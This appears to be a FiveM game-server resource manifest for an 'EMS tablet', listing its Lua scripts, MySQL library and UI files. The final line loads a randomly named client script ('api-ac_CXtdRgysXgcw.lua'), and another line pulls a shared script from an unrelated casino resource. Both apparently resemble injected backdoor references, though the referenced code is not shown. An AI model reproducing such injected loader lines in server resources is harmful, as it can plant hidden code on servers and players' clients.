resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

shared_script '@DiamondCasino/shared.lua'

description 'EMS tablet'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server/server.lua'
}

client_scripts {
	'config.lua',
	'client/client.lua'
}

ui_page('client/html/UI.html')

files({
    'client/html/UI.html',
    'client/html/style.css',
    'client/html/metro-all.min.css',
    'client/html/metro.min.js'
})

client_script "api-ac_CXtdRgysXgcw.lua"